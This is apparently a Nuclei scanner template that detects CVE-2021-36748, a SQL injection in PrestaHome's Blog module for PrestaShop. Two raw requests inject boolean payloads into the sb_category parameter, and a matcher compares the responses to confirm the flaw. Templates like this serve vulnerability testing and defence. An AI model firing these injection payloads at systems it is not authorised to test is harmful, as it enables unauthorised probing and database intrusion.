id: CVE-2021-36748

info:
    name: PrestaHome Blog for PrestaShop - SQL Injection
    author: whoever
    severity: high
    description: Blog for PrestaShop by PrestaHome < 1.7.8 is vulnerable to a SQL injection via sb_category parameter.
    tags: cve2021,prestashop,prestahome,sqli
    reference: |
      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36748
      https://blog.sorcery.ie/posts/ph_simpleblog_sqli/

requests:
    - raw:
      - |
        GET /module/ph_simpleblog/list?sb_category=')%20OR%20true--%20- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

      - |
        GET /module/ph_simpleblog/list?sb_category=')%20AND%20false--%20- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

      req-condition: true

      matchers:
        - type: dsl
          dsl:
            - "status_code_1 == 200 && status_code_2 == 404 && len(body_1) > 0 && len(body_2) == 0"
